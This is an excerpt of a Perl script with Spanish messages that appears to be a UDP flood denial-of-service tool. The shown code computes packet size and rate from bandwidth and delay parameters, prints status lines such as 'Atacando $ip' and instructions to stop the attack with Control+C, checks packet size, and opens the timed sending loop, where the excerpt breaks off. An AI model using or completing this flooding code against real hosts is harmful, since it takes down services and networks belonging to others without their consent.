...
if ($bw && $delay) {
  print "AVISO: Enviando Packetes --size, Parámetro Evitado. Podría haber fallos\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}
...
print "Atacando $ip " . ($port ? $port : "random") . " Puerto Desde " . 
  ($size ? "$size-byte" : "random size") . " packets" . ($time ? " por $time segundos" : "") . "\n";
print "Deelay Del Paquete: $delay msegundos\n" if $delay;
print "KiloBats Por Segundo: $bw kbps\n" if $bw;
print "Frena el Ataque con Control + C" unless $time;

die "Se solicitó un tamaño de paquete no válido: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
